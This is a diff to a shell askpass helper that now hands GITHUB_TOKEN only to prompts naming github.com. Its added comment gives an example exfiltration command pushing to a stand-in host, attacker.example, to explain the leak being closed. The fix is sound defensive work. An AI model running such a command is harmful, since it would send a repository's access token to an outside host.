@@ -1,6 +1,10 @@
 #!/usr/bin/env sh
+# Only answer prompts for github.com -- git's askpass prompt text includes the
+# target host (e.g. "Username for 'https://github.com'"), so without this
+# check GIT_ASKPASS would hand GITHUB_TOKEN to any host a git command in the
+# managed repo talks to (e.g. `git push https://attacker.example/x`).
 case "$1" in
-  *Username*) echo "x-access-token" ;;
-  *Password*) echo "${GITHUB_TOKEN:-}" ;;
+  *[Uu]sername*github.com*) echo "x-access-token" ;;
+  *[Pp]assword*github.com*) echo "${GITHUB_TOKEN:-}" ;;
   *) echo "" ;;
 esac
